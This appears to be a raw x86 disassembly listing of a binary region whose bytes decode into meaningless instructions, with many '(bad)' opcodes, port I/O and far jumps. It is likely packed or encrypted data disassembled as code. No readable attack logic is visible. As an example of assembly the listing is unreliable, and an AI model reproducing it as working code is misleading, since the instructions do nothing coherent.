  40b057:	jne    0x40b0bb
  40b059:	and    eax,0xc66e27f9
  40b05e:	pop    ebx
  40b05f:	shl    esi,1
  40b061:	dec    ebx
  40b062:	push   ds
  40b063:	bts    DWORD PTR [ecx-0x3],edx
  40b067:	jmp    0xa258b53
  40b06c:	sbb    eax,0x51af5319
  40b071:	je     0x40b0d1
  40b073:	add    BYTE PTR [edx-0x6],al
  40b076:	or     DWORD PTR [edx-0x72],eax
  40b079:	jmp    0x40b021
  40b07b:	popf   
  40b07c:	sub    DWORD PTR [ebx+0x7bd7e006],0x15a88554
  40b086:	and    eax,0x10bfaf3e
  40b08b:	mov    al,ds:0xad0ef8a9
  40b090:	or     al,0x7c
  40b092:	cwde   
  40b093:	cdq    
  40b094:	imul   edx,esi,0x14e3db58
  40b09a:	test   dh,cl
  40b09c:	jo     0x40b021
  40b09e:	cmc    
  40b09f:	mov    edi,0x3a4552e8
  40b0a4:	dec    ecx
  40b0a5:	addr16 std 
  40b0a7:	xchg   BYTE PTR [ecx+0x307172c1],bl
  40b0ad:	cmp    DWORD PTR [eax+0x6ed46e5e],edx
  40b0b3:	xor    al,BYTE PTR [edi]
  40b0b5:	xor    eax,0xc2656c02
  40b0ba:	pop    edi
  40b0bb:	or     BYTE PTR [edi-0x2691d61d],ch
  40b0c1:	pop    edx
  40b0c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0c3:	imul   edi,DWORD PTR [ecx-0x71426292],0xffffffea
  40b0ca:	and    DWORD PTR [edx+0x4f],ebx
  40b0cd:	add    al,0xfc
  40b0cf:	popf   
  40b0d0:	mov    bh,0x8c
  40b0d2:	adc    edx,ebx
  40b0d4:	lds    eax,FWORD PTR [ebx]
  40b0d6:	hlt    
  40b0d7:	jg     0x40b10a
  40b0d9:	outs   dx,DWORD PTR ds:[esi]
  40b0da:	mov    bh,0xc
  40b0dc:	stos   DWORD PTR es:[edi],eax
  40b0dd:	push   ebx
  40b0de:	and    eax,0x73370a5d
  40b0e3:	fwait
  40b0e4:	mov    bh,ch
  40b0e6:	add    esp,eax
  40b0e8:	mov    dh,0x45
  40b0ea:	dec    esi
  40b0eb:	cmp    ah,dh
  40b0ed:	hlt    
  40b0ee:	mov    al,ds:0x92cefd5f
  40b0f3:	in     al,0x7d
  40b0f5:	and    dh,BYTE PTR [ebp-0x5e62b192]
  40b0fb:	repz (bad) [edi+0x796917b4]
  40b102:	aad    0x5a
  40b104:	push   es
  40b105:	xor    eax,0x90e743c1
  40b10a:	pop    ss
  40b10b:	(bad)  
  40b10c:	add    al,0x5e
  40b10e:	out    0xbd,eax
  40b110:	imul   esi,DWORD PTR [esi],0x31
  40b113:	add    ch,BYTE PTR [esi]
  40b115:	jns    0x40b171
  40b117:	xchg   ecx,eax
  40b118:	lods   eax,DWORD PTR ds:[esi]
  40b119:	mov    edi,DWORD PTR [eax-0x1]
  40b11c:	(bad)  
  40b11d:	(bad)  
  40b11e:	fst    st(5)
  40b120:	daa    
  40b121:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b122:	fsubrp st(3),st
  40b124:	icebp  
  40b125:	or     BYTE PTR [ebx],bh
  40b127:	and    ebp,DWORD PTR [edx+0x14]
  40b12a:	push   ss
  40b12b:	loop   0x40b140
  40b12d:	push   ecx
  40b12e:	or     al,0x45
  40b130:	xchg   edi,eax
  40b131:	test   DWORD PTR [ecx],eax
  40b133:	push   ebp
  40b134:	xchg   ebx,eax
  40b135:	mov    ?,WORD PTR [eax-0x67039fb3]
  40b13b:	fdivr  DWORD PTR [esi+0x21]
  40b13e:	ss jecxz 0x40b0d2
  40b141:	imul   edx,eax,0xf7524ca1
  40b147:	mov    esi,0x356991e0
  40b14c:	int3   
  40b14d:	xchg   ebx,eax
  40b14e:	test   eax,0x1182da89
  40b153:	jne    0x40b176
  40b155:	in     eax,dx
  40b156:	sub    eax,0x72e5349e
  40b15b:	mov    ebp,0x2614f2e
  40b160:	int3   
  40b161:	int3   
  40b162:	pop    eax
  40b163:	sbb    ebx,ecx
  40b165:	je     0x40b0ef
  40b167:	adc    ch,BYTE PTR [ecx]
  40b169:	nop
  40b16a:	pop    ss
  40b16b:	lods   eax,DWORD PTR ds:[esi]
  40b16c:	jecxz  0x40b165
  40b16e:	mov    ebp,eax
  40b170:	pusha  
  40b171:	cs sbb eax,0xc231d181
  40b177:	in     al,0xac
  40b179:	pushf  
  40b17a:	ins    BYTE PTR es:[edi],dx
  40b17b:	sbb    eax,DWORD PTR es:[edi-0x2b]
  40b17f:	sbb    bh,al
  40b181:	xor    DWORD PTR [ebx],edi
  40b183:	mov    cl,bh
  40b185:	mov    eax,0x8101401
  40b18a:	stos   DWORD PTR es:[edi],eax
  40b18b:	adc    BYTE PTR [esi-0x34],cl
  40b18e:	ja     0x40b1b7
  40b190:	dec    eax
  40b191:	ins    DWORD PTR es:[edi],dx
  40b192:	fidivr DWORD PTR [ebx+esi*8]
  40b195:	mov    ebp,0x577f08c7
  40b19a:	dec    esi
  40b19b:	sbb    al,BYTE PTR [eax]
  40b19d:	adc    DWORD PTR [eax-0x2d],0xfc4ee3a5
  40b1a4:	cli    
  40b1a5:	jle    0x40b1f5
  40b1a7:	in     al,0xbc
  40b1a9:	test   al,0x7
  40b1ab:	pop    esp
  40b1ac:	add    eax,0x3bcaf253
  40b1b1:	dec    ebp
  40b1b2:	rol    DWORD PTR [ebx-0x65113888],cl
  40b1b8:	cwde   
  40b1b9:	int    0x61
  40b1bb:	jbe    0x40b18d
  40b1bd:	clc    
  40b1be:	push   esp
  40b1bf:	fst    DWORD PTR ds:0x1f93b817
  40b1c5:	mov    ds:0x5a2ca46f,eax
  40b1ca:	in     al,0x43
  40b1cc:	je     0x40b23f
  40b1ce:	(bad)  
  40b1cf:	shl    DWORD PTR [ebx+0x24],1
  40b1d2:	ror    DWORD PTR [ebx+0x26],cl
  40b1d5:	adc    eax,0x5d607d9b
  40b1da:	mov    cl,0xf6
  40b1dc:	xor    DWORD PTR [ecx+edx*8],esp
  40b1df:	(bad)  
  40b1e0:	sub    ch,dh
  40b1e2:	sub    eax,0x5c235104
  40b1e7:	into   
  40b1e8:	jne    0x40b17c
  40b1ea:	outs   dx,BYTE PTR ds:[esi]
  40b1eb:	mov    eax,0x9dc0dbf6
  40b1f0:	cmc    
  40b1f1:	sbb    ch,BYTE PTR [ebx-0x2e]
  40b1f4:	scas   al,BYTE PTR es:[edi]
  40b1f5:	popa   
  40b1f6:	aas    
  40b1f7:	mov    edx,0xe65010f2
  40b1fc:	xchg   esp,eax
  40b1fd:	fscale 
  40b1ff:	rol    al,1
  40b201:	mov    eax,0x944d4bcc
  40b206:	aad    0xad
  40b208:	sti    
  40b209:	xchg   esi,eax
  40b20a:	stc    
  40b20b:	test   ch,bh
  40b20d:	push   ecx
  40b20e:	and    bl,BYTE PTR [ebx]
  40b210:	pusha  
  40b211:	out    dx,al
  40b212:	repnz mov al,0x2c
  40b215:	adc    BYTE PTR [ebx-0x2a],bh
  40b218:	(bad)  
  40b219:	in     al,dx
  40b21a:	rcr    cl,0x19
  40b21d:	add    bh,ch
  40b21f:	xor    al,0x72
  40b221:	test   eax,0xb470d4ca
  40b226:	sahf   
  40b227:	mov    BYTE PTR [ebx+0x72],cl
  40b22a:	pop    eax
  40b22b:	push   ebx
  40b22c:	sar    al,cl
  40b22e:	inc    esp
  40b22f:	mov    BYTE PTR ds:0x2c8e2e30,bl
  40b235:	sbb    esp,ebp
  40b237:	pop    ecx
  40b238:	xchg   ebx,eax
  40b239:	mov    esp,0xa8ad96b8
  40b23e:	imul   esp,esi,0xffffff8d
  40b241:	fnstsw WORD PTR [edx]
  40b243:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b244:	imul   BYTE PTR [eax+ebp*1+0x2f]
  40b248:	repz pop edx
  40b24a:	fdiv   QWORD PTR [esi-0x8]
  40b24d:	fwait
  40b24e:	dec    edi
  40b24f:	add    DWORD PTR [edx],edi
  40b251:	stc    
  40b252:	daa    
  40b253:	dec    ecx
  40b254:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b255:	xchg   cl,bh
  40b257:	push   edx
  40b258:	dec    esi
  40b259:	cli    
  40b25a:	test   BYTE PTR ds:0x77c28ba9,al
  40b260:	mov    eax,ds:0x5098bcc3
  40b265:	fstp   QWORD PTR [ecx+0xdeb9fdb]
  40b26b:	sbb    eax,0xd1c14066
  40b270:	add    esp,edx
  40b272:	fdiv   QWORD PTR [edx+0x475b22b9]
  40b278:	sub    al,cl
  40b27a:	jbe    0x40b2c3
  40b27c:	jne    0x40b25b
  40b27e:	and    BYTE PTR [edx+edi*8-0x50],0x83
  40b283:	shl    BYTE PTR [esi+esi*2],cl
  40b286:	mov    cl,0x4
  40b288:	xor    eax,0x1ef93663
  40b28d:	in     eax,dx
  40b28e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b28f:	mov    cl,bh
  40b291:	test   BYTE PTR [ebp+eax*4-0x113142ec],ah
  40b298:	add    BYTE PTR [edx-0x78],bh
  40b29b:	loope  0x40b315
  40b29d:	jmp    0x40b318
  40b29f:	dec    edi
  40b2a0:	js     0x40b27c
  40b2a2:	dec    ebp
  40b2a3:	test   cl,dl
  40b2a5:	iret   
  40b2a6:	outs   dx,BYTE PTR ds:[esi]
  40b2a7:	mov    esi,0xcfbcdd3b
  40b2ac:	pop    eax
  40b2ad:	or     eax,DWORD PTR [edi+ebp*1]
  40b2b0:	pop    eax
  40b2b1:	in     eax,dx
  40b2b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2b3:	push   edi
  40b2b4:	inc    ecx
  40b2b5:	inc    ecx
  40b2b6:	jecxz  0x40b2ec
  40b2b8:	jg     0x40b2d1
  40b2ba:	out    dx,eax
  40b2bb:	(bad)  
  40b2bc:	xor    BYTE PTR [eax+0x6d12420e],bl
  40b2c2:	inc    ebx
  40b2c3:	outs   dx,BYTE PTR ds:[esi]
  40b2c4:	jbe    0x40b24b
  40b2c6:	pop    es
  40b2c7:	jnp    0x40b346
  40b2c9:	or     DWORD PTR [ebp-0x2c51fbb1],ebp
  40b2cf:	sub    bh,bh
  40b2d1:	repnz cdq 
  40b2d3:	es dec ecx
  40b2d5:	xchg   ecx,eax
  40b2d6:	cmp    DWORD PTR [ebp-0x1fadf63b],0xffffffd1
  40b2dd:	test   BYTE PTR [ebp-0x619ebad3],ah
  40b2e3:	push   ds
  40b2e4:	not    bl
  40b2e6:	mov    DWORD PTR [ebp+0x2d906dc7],ebx
  40b2ec:	sub    DWORD PTR [edi],ebp
  40b2ee:	xlat   BYTE PTR ds:[ebx]
  40b2ef:	stc    
  40b2f0:	lods   eax,DWORD PTR ds:[esi]
  40b2f1:	xchg   ebp,eax
  40b2f2:	lahf   
  40b2f3:	popa   
  40b2f4:	das    
  40b2f5:	punpckhdq mm4,QWORD PTR [edi]
  40b2f8:	pop    esi
  40b2f9:	lahf   
  40b2fa:	xor    bh,ah
  40b2fc:	sub    al,0x82
  40b2fe:	pusha  
  40b2ff:	scas   al,BYTE PTR es:[edi]
  40b300:	aad    0x33
  40b302:	and    eax,0xbd24d8b5
  40b307:	adc    eax,0x57f16c0e
  40b30c:	mov    ecx,edx
  40b30e:	and    edi,ecx
  40b310:	push   edi
  40b311:	sahf   
  40b312:	mov    ah,0x10
  40b314:	cmp    al,0xc7
  40b316:	aaa    
  40b317:	or     ch,BYTE PTR [esi+edx*1-0x45384725]
  40b31e:	xchg   DWORD PTR [esp+ecx*1+0x8],ebp
  40b322:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b323:	ins    BYTE PTR es:[edi],dx
  40b324:	popa   
  40b325:	iret   
  40b326:	and    bh,BYTE PTR ds:0x5bc863be
  40b32c:	mov    esp,0x7f46c4f
  40b331:	or     bh,dh
  40b333:	scas   al,BYTE PTR es:[edi]
  40b334:	xchg   esi,eax
  40b335:	push   edx
  40b336:	jnp    0x40b328
  40b338:	fucom  st(1)
  40b33a:	jnp    0x40b2c9
  40b33c:	mov    ds:0xa6aa70e0,al
  40b341:	xor    bh,BYTE PTR [ecx-0x2de30c1f]
  40b347:	js     0x40b330
  40b349:	outs   dx,BYTE PTR ds:[esi]
  40b34a:	call   0xe646:0x7145b859
  40b351:	clc    
  40b352:	sub    eax,0x54235a0
  40b357:	jmp    DWORD PTR [edx]
  40b359:	push   eax
  40b35a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b35b:	jecxz  0x40b365
  40b35d:	daa    
  40b35e:	jmp    DWORD PTR [eax-0x609b9f51]
  40b364:	mov    edx,0x32ac08ff
  40b369:	add    cl,BYTE PTR [ebx-0x47]
  40b36c:	shl    dh,0x60
  40b36f:	cmp    BYTE PTR [eax],dl
  40b371:	adc    edx,DWORD PTR ds:0xce6f3eac
  40b377:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b378:	rol    DWORD PTR [ebx-0xd2b4d01],1
  40b37e:	lea    ecx,[ecx-0x62]
  40b381:	dec    ebx
  40b382:	outs   dx,BYTE PTR ds:[esi]
  40b383:	lods   al,BYTE PTR ds:[esi]
  40b384:	xchg   edi,eax
  40b385:	xchg   ebp,eax
  40b386:	mov    dh,0x4c
  40b388:	jmp    0xe58b:0x2a5d834d
  40b38f:	sbb    eax,0x32981153
  40b394:	mov    BYTE PTR [ebp+0x2a],cl
  40b397:	add    al,0x37
  40b399:	sub    DWORD PTR [eax+ecx*4],eax
  40b39c:	adc    dl,ch
  40b39e:	adc    DWORD PTR [eax*2-0x6c430527],eax
  40b3a5:	jmp    0x40b3d5
  40b3a7:	dec    esi
  40b3a8:	mov    bl,0x32
  40b3aa:	out    0x7b,al
  40b3ac:	(bad)  
  40b3ae:	not    DWORD PTR [eax]
  40b3b0:	push   ebp
  40b3b1:	(bad)  
  40b3b2:	cmp    ax,0x5de1
  40b3b6:	stos   DWORD PTR es:[edi],eax
  40b3b7:	cmp    DWORD PTR ds:0x41b562a,esp
  40b3bd:	mov    ds:0x2c6fe693,eax
  40b3c2:	mov    al,ds:0xe708484f
  40b3c7:	add    eax,0xcecded2d
  40b3cc:	stc    
  40b3cd:	icebp  
  40b3ce:	push   ebp
  40b3cf:	aam    0x4c
  40b3d1:	stos   DWORD PTR es:[edi],eax
  40b3d2:	jecxz  0x40b36f
  40b3d4:	adc    BYTE PTR [ecx],ah
  40b3d6:	mov    ebx,0x41eb792
  40b3db:	(bad)  
  40b3dc:	fisttp WORD PTR [ecx]
  40b3de:	pop    eax
  40b3df:	cmp    BYTE PTR [esi],dh
  40b3e1:	mov    cl,0x71
  40b3e3:	int    0x96
  40b3e5:	ds mov al,0x89
  40b3e8:	sar    dl,1
  40b3ea:	fsubr  QWORD PTR [ecx+0x58]
  40b3ed:	sbb    BYTE PTR [eax+ecx*1],cl
  40b3f0:	mov    cl,0x1f
  40b3f2:	loope  0x40b374
  40b3f4:	inc    esp
  40b3f5:	icebp  
  40b3f6:	cld    
  40b3f7:	ficom  WORD PTR [edx-0x5e]
  40b3fa:	loope  0x40b3a2
  40b3fc:	popa   
  40b3fd:	dec    esp
  40b3fe:	lds    edx,FWORD PTR [esi-0x3d460632]
  40b404:	inc    esi
  40b405:	scas   eax,DWORD PTR es:[edi]
  40b406:	mov    bh,0x68
  40b408:	cs call 0xdbbfbb99
  40b40e:	in     eax,0xb5
  40b410:	pushf  
  40b411:	jb     0x40b432
  40b413:	jbe    0x40b412
  40b415:	adc    eax,0xab3cb908
  40b41a:	dec    edi
  40b41b:	push   ss
  40b41c:	sbb    DWORD PTR [esi+ecx*4+0x16],esi
  40b420:	repz std 
  40b422:	cdq    
  40b423:	push   cs
  40b424:	sub    BYTE PTR [esi+0x11],cl
  40b427:	adc    eax,0xb59d90d
  40b42c:	imul   ebx
  40b42e:	pushf  
  40b42f:	in     al,0xb2
  40b431:	xchg   edi,eax
  40b432:	push   es
  40b433:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b434:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b435:	repnz mov dl,0xf
  40b438:	pop    ds
  40b439:	sub    BYTE PTR [esi],0x34
  40b43c:	xchg   ecx,eax
  40b43d:	jbe    0x40b3e7
  40b43f:	repnz aas 
  40b441:	gs scas eax,DWORD PTR es:[edi]
  40b443:	pop    es
  40b444:	push   cs
  40b445:	mov    ds:0x5bb782f9,al
  40b44a:	fadd   DWORD PTR [eax]
  40b44c:	outs   dx,BYTE PTR ds:[esi]
  40b44d:	and    ebx,ecx
  40b44f:	mov    bh,0x3
  40b451:	in     eax,dx
  40b452:	sub    BYTE PTR [edx+0x1],0xd3
  40b456:	ss pop esi
  40b458:	mov    BYTE PTR [eax+0x694aec4d],cl
  40b45e:	fdiv   DWORD PTR [ecx-0x82b22fb]
  40b465:	(bad)  
  40b466:	cmp    eax,0x24394309
  40b46b:	jo     0x40b49c
  40b46d:	mov    ah,0xb7
  40b46f:	pop    edx
  40b470:	aas    
  40b471:	or     ah,ch
  40b473:	fld    TBYTE PTR [edi+0x13e9d63f]
  40b479:	push   0xf
  40b47b:	mov    ch,0x40
  40b47d:	loop   0x40b45e
  40b47f:	push   esi
  40b480:	add    al,0x7a
  40b482:	outs   dx,DWORD PTR ds:[esi]
  40b483:	pop    ds
  40b484:	and    eax,0xcda563e6
  40b489:	call   0x3cf47baa
  40b48e:	mov    dh,0x51
  40b490:	ins    DWORD PTR es:[edi],dx
  40b491:	stc    
  40b492:	outs   dx,DWORD PTR ds:[esi]
  40b493:	push   esp
  40b494:	jl     0x40b422
  40b496:	mov    ch,0x37
  40b498:	out    dx,al
  40b499:	jbe    0x40b495
  40b49b:	jle    0x40b50d
  40b49d:	lock add eax,0x83f9c65e
  40b4a3:	into   
  40b4a4:	loopne 0x40b4ff
  40b4a6:	sub    al,0xc5
  40b4a8:	in     al,dx
  40b4a9:	es icebp 
  40b4ab:	inc    ebx
  40b4ac:	push   edx
  40b4ad:	lea    edi,[esi-0x41]
  40b4b0:	lods   eax,DWORD PTR ds:[esi]
  40b4b1:	neg    BYTE PTR [ebx+edx*8-0x38]
  40b4b5:	sub    al,0xca
  40b4b7:	inc    eax
  40b4b8:	ret    0x154f
  40b4bb:	sub    dl,cl
  40b4bd:	adc    esp,DWORD PTR ds:0x5c7a017d
  40b4c3:	in     eax,dx
  40b4c4:	xor    BYTE PTR [esi],ch
  40b4c6:	or     BYTE PTR ds:0x8e291cf4,dh
  40b4cc:	scas   al,BYTE PTR es:[edi]
  40b4cd:	loop   0x40b4bc
  40b4cf:	jmp    0xb4dc:0xf970a828
  40b4d6:	push   esp
  40b4d7:	ins    DWORD PTR es:[edi],dx
  40b4d8:	pop    ebx
  40b4d9:	ins    BYTE PTR es:[edi],dx
  40b4da:	jp     0x40b497
  40b4dc:	xchg   BYTE PTR [ebp-0x54],dh
  40b4df:	popf   
  40b4e0:	fucomip st,st(1)
  40b4e2:	xchg   edx,eax
  40b4e3:	and    ah,BYTE PTR [ebx-0x6e]
  40b4e6:	xor    DWORD PTR [ecx-0x5df32975],0xffffffeb
  40b4ed:	xlat   BYTE PTR ds:[ebx]
  40b4ee:	add    dh,BYTE PTR [esi-0x33]
  40b4f1:	jnp    0x40b4f2
  40b4f3:	xchg   edx,eax
  40b4f4:	stc    
  40b4f5:	and    eax,0x1195370c
  40b4fa:	cmp    DWORD PTR [edx],edx
  40b4fc:	loope  0x40b57a
  40b4fe:	ffreep st(3)
  40b500:	mov    cl,0xf
  40b502:	stos   DWORD PTR es:[edi],eax
  40b503:	jle    0x40b4d5
  40b505:	push   0x51f525e7
  40b50a:	push   ebx
  40b50b:	xchg   esi,eax
  40b50c:	int    0x84
  40b50e:	mov    ebx,0x7fea55d2
  40b513:	xchg   ecx,eax
  40b514:	sbb    al,0x63
  40b516:	out    0xef,al
  40b518:	xchg   edi,eax
  40b519:	push   esi
  40b51a:	jo     0x40b553
  40b51c:	pusha  
  40b51d:	or     eax,0xb5367cd9
  40b522:	mov    ecx,0x8ef20e97
  40b527:	in     al,dx
  40b528:	data16 icebp 
  40b52a:	shl    BYTE PTR [edi],0xa9
  40b52d:	lahf   
  40b52e:	jmp    0x7878:0x1b1cc545
  40b535:	es out dx,al
  40b537:	ja     0x40b50b
  40b539:	fwait
  40b53a:	adc    DWORD PTR [ebx*8+0x48fa4e09],ecx
  40b541:	test   al,0x76
  40b543:	dec    ebp
  40b544:	cmp    DWORD PTR [ebx+0x64],0x942ee78e
  40b54b:	xor    DWORD PTR [edi+0x34],esi
  40b54e:	je     0x40b4e4
  40b550:	mov    ds:0xfd7858de,eax
  40b555:	xchg   edi,eax
  40b556:	sbb    cl,ah
  40b558:	and    eax,0xc8f6a4a5
  40b55d:	dec    esi
  40b55e:	pop    eax
  40b55f:	jp     0x40b4ee
  40b561:	call   0xea8d:0x76458059
  40b568:	mov    edx,0xe39cbb79
  40b56d:	gs stos DWORD PTR es:[edi],eax
  40b56f:	sub    DWORD PTR [eax-0x53],esi
  40b572:	xor    eax,esi
  40b574:	imul   ebx,DWORD PTR cs:[ebp+0x29],0x2e4d9b6d
  40b57c:	out    0x7d,al
  40b57e:	dec    ebp
  40b57f:	pop    esp
  40b580:	leave  
  40b581:	xor    edx,eax
  40b583:	fstp   TBYTE PTR [ebx+0x6aab050d]
  40b589:	pop    esp
  40b58a:	xor    eax,0x32a17c02
  40b58f:	daa    
  40b590:	(bad)  
  40b591:	aas    
  40b592:	pop    ebp
  40b593:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b594:	bound  esp,QWORD PTR [esp+eiz*8]
  40b597:	sbb    ebp,edi
  40b599:	push   esp
  40b59a:	sbb    al,BYTE PTR [ebp-0xf]
  40b59d:	mov    ds:0x2234b81,al
  40b5a2:	leave  
  40b5a3:	xchg   ecx,eax
  40b5a4:	adc    BYTE PTR ds:0x585805a,ch
  40b5aa:	inc    eax
  40b5ab:	es or  al,0x54
  40b5ae:	jnp    0x40b5d3
  40b5b0:	leave  
  40b5b1:	scas   al,BYTE PTR es:[edi]
  40b5b2:	(bad)  
  40b5b3:	fisubr DWORD PTR [edi-0x702e9aee]
  40b5b9:	sbb    al,BYTE PTR [edx+0x3c72d37b]
  40b5bf:	push   eax
  40b5c0:	inc    eax
  40b5c1:	ins    DWORD PTR es:[edi],dx
  40b5c2:	ds push ebx
  40b5c4:	shl    DWORD PTR [eax],0xea
  40b5c7:	int3   
  40b5c8:	pop    edi
  40b5c9:	and    DWORD PTR [eax+0x34],esp
  40b5cc:	mov    al,ds:0xe37c7cc3
  40b5d1:	jp     0x40b59c
  40b5d3:	pop    ebp
  40b5d4:	lock sub dl,ah
  40b5d7:	in     al,dx
  40b5d8:	into   
  40b5d9:	stos   BYTE PTR es:[edi],al
  40b5da:	dec    edx
  40b5db:	cmp    BYTE PTR [edx+eiz*4-0x45],bl
  40b5df:	retf   
  40b5e0:	dec    eax
  40b5e1:	push   edi
  40b5e2:	mov    esp,0x159055f5
  40b5e7:	cli    
  40b5e8:	add    al,0x7a
  40b5ea:	xor    bh,BYTE PTR [ebx]
  40b5ec:	out    0x68,al
  40b5ee:	sub    dh,bh
  40b5f0:	push   ds
  40b5f1:	fadd   QWORD PTR [eax]
  40b5f3:	fs cwde 
  40b5f5:	jns    0x40b604
  40b5f7:	repz xor cl,BYTE PTR [esi-0xddb0061]
  40b5fe:	sub    eax,DWORD PTR [edx-0x231b3b42]
  40b604:	das    
  40b605:	mov    bh,0x1d
  40b607:	cmp    al,0x82
  40b609:	push   ss
  40b60a:	jbe    0x40b627
  40b60c:	ret    
  40b60d:	clc    
  40b60e:	stos   BYTE PTR es:[edi],al
  40b60f:	xchg   esi,eax
  40b610:	push   edx
  40b611:	outs   dx,BYTE PTR ds:[esi]
  40b612:	sti    
  40b613:	in     al,dx
  40b614:	rcr    DWORD PTR [esi+0x20428800],cl
  40b61a:	leave  
  40b61b:	jmp    0x33bce2a
  40b620:	icebp  
  40b621:	or     DWORD PTR [edx],ebx
  40b623:	std    
  40b624:	cmp    al,0x89
  40b626:	(bad)  
  40b627:	outs   dx,DWORD PTR ds:[esi]
  40b628:	mov    bl,0xda
  40b62a:	adc    ebx,DWORD PTR [eax-0x51]
  40b62d:	loopne 0x40b601
  40b62f:	push   0xe086e425
  40b634:	std    
  40b635:	out    dx,eax
  40b636:	and    eax,0xea3fe591
  40b63b:	adc    DWORD PTR [ecx],ebp
  40b63d:	mov    edi,0x72567b44
  40b642:	jmp    0x6d52:0x90a85b8f
  40b649:	jne    0x40b5e5
  40b64b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b64c:	rcr    BYTE PTR [ecx+0x78d9ec9a],0xe7
  40b653:	jb     0x40b6bb
  40b655:	push   edi
  40b656:	sbb    eax,0xc0697f56
  40b65b:	clc    
  40b65c:	arpl   WORD PTR [ebx+edi*8+0x6e],bx
  40b660:	cli    
  40b661:	addr16 mov al,ds:0x9eef
  40b665:	lock inc eax
  40b667:	cmp    eax,0x4869dfff
  40b66c:	scas   al,BYTE PTR es:[edi]
  40b66d:	push   esi
  40b66e:	loope  0x40b699
  40b670:	jp     0x40b6a0
  40b672:	fdivr  DWORD PTR [edx-0x7d]
  40b675:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b676:	jg     0x40b66d
  40b678:	aam    0xee
  40b67a:	test   BYTE PTR [eax-0x66],dh
  40b67d:	dec    ebp
  40b67e:	cmp    BYTE PTR [ecx+0x107d0508],dh
  40b684:	fisub  DWORD PTR [edi+eax*1+0x6977afa8]
  40b68b:	adc    al,0x15
  40b68d:	sub    DWORD PTR [ebx],ebx
  40b68f:	mov    edx,DWORD PTR [ecx+ebx*1]
  40b692:	jecxz  0x40b67e
  40b694:	stc    
  40b695:	sub    ah,BYTE PTR [ebx+eax*2-0x75]
  40b699:	xor    eax,0x5a2eef11
  40b69e:	mov    BYTE PTR [edx-0x19],bh
  40b6a1:	push   ds
  40b6a2:	adc    esp,edx
  40b6a4:	adc    eax,0x7af1791d
  40b6a9:	fisubr DWORD PTR [ebx+edi*1-0x62]
  40b6ad:	sbb    DWORD PTR [edx],edx
  40b6af:	clc    
  40b6b0:	dec    edx
  40b6b1:	inc    esp
  40b6b2:	les    ebx,FWORD PTR [esi+ebx*4+0x6714993f]
  40b6b9:	pop    edi
  40b6ba:	test   edx,edi
  40b6bc:	sub    esp,esi
  40b6be:	adc    eax,eax
  40b6c0:	mov    ah,0xc4
  40b6c2:	mov    eax,0x1f099c3a
  40b6c7:	js     0x40b6f9
  40b6c9:	xchg   ebp,eax
  40b6ca:	mov    eax,0x400f5a1d
  40b6cf:	js     0x40b65b
  40b6d1:	stc    
  40b6d2:	dec    ebx
  40b6d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6d4:	sbb    ebx,edx
  40b6d6:	outs   dx,BYTE PTR ds:[esi]
  40b6d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6d8:	int    0xe3
  40b6da:	iret   
  40b6db:	lock adc esi,DWORD PTR [ecx-0x6b]
  40b6df:	out    dx,al
  40b6e0:	pushf  
  40b6e1:	ror    BYTE PTR [edx],0x49
  40b6e4:	mov    DWORD PTR [edi-0x66],esp
  40b6e7:	push   0xffffffae
  40b6e9:	pop    ebx
  40b6ea:	add    al,0x2a
  40b6ec:	cmp    ah,ah
  40b6ee:	inc    ebx
  40b6ef:	std    
  40b6f0:	jae    0x40b6e6
  40b6f2:	xor    al,0xa3
  40b6f4:	sar    DWORD PTR [esi],cl
  40b6f6:	into   
  40b6f7:	push   ss
  40b6f8:	jmp    0x40b6cc
  40b6fa:	xor    esp,DWORD PTR [ecx+edx*1-0xf62598e]
  40b701:	and    BYTE PTR [ebx+0x5b],al
  40b704:	adc    esp,DWORD PTR ds:0x9895f4ed
  40b70a:	sub    cl,dh
  40b70c:	ja     0x40b6e3
  40b70e:	mov    al,ds:0x17f5c0ff
  40b713:	loopne 0x40b70a
  40b715:	lahf   
  40b716:	test   eax,0xd010b13a
  40b71b:	and    DWORD PTR [ecx-0xd59b5],esi
  40b721:	inc    edx
  40b722:	pop    esp
  40b723:	dec    edx
  40b724:	imul   eax,DWORD PTR [edi-0x41],0xffffff93
  40b728:	xchg   ebp,eax
  40b729:	cmp    esi,DWORD PTR ds:0x4c506a27
  40b72f:	mov    es,WORD PTR ds:0x9b630509
  40b735:	inc    ebp
  40b736:	pop    eax
  40b737:	lds    edx,FWORD PTR [ecx+0x1b]
  40b73a:	imul   DWORD PTR [edx+edx*4]
  40b73d:	cmp    DWORD PTR [eax],0xffffff86
  40b740:	bound  esi,QWORD PTR [ebx]
  40b742:	cld    
  40b743:	jge    0x40b7ba
  40b745:	lock xchg ebx,eax
  40b747:	repnz test DWORD PTR [edx+0x43],ebp
  40b74b:	stc    
  40b74c:	inc    edi
  40b74d:	jnp    0x40b731
  40b74f:	jmp    0x2612e87e
  40b754:	outs   dx,BYTE PTR ds:[esi]
  40b755:	adc    ecx,DWORD PTR [esi+esi*2-0x7561a7fd]
  40b75c:	sbb    eax,0x2c6dff7a
  40b761:	stos   DWORD PTR es:[edi],eax
  40b762:	into   
  40b763:	cdq    
  40b764:	int3   
  40b765:	mov    ah,0x97
  40b767:	rcl    BYTE PTR [eax+esi*8],1
  40b76a:	lahf   
  40b76b:	sbb    al,0xec
  40b76d:	jle    0x40b6fd
  40b76f:	loop   0x40b79a
  40b771:	cwde   
  40b772:	fcomp  QWORD PTR [edi-0xc4f90d8]
  40b778:	loop   0x40b7f6
  40b77a:	mov    eax,ds:0xc0bbf484
  40b77f:	in     eax,dx
  40b780:	or     BYTE PTR [ebx],ah
